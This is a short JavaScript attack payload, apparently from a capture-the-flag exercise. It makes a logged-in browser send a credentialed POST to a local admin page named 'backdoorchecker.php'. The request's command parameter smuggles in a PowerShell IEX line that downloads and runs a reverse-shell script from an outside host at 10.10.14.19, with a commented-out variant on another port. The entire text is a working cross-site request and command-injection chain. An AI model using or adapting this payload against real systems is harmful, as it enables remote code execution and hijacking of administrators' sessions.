var xhr = new XMLHttpRequest();
var url = 'http://localhost/admin/backdoorchecker.php';
//var params = 'cmd=dir | powershell "IEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.19/rev_443.ps1\')"';
var params = 'cmd=dir | powershell "IEX(New-Object System.Net.WebClient).DownloadString(\'http://10.10.14.19/rev_8888.ps1\')"';
xhr.open('POST', url);
xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
xhr.withCredentials = true;
xhr.send(params);
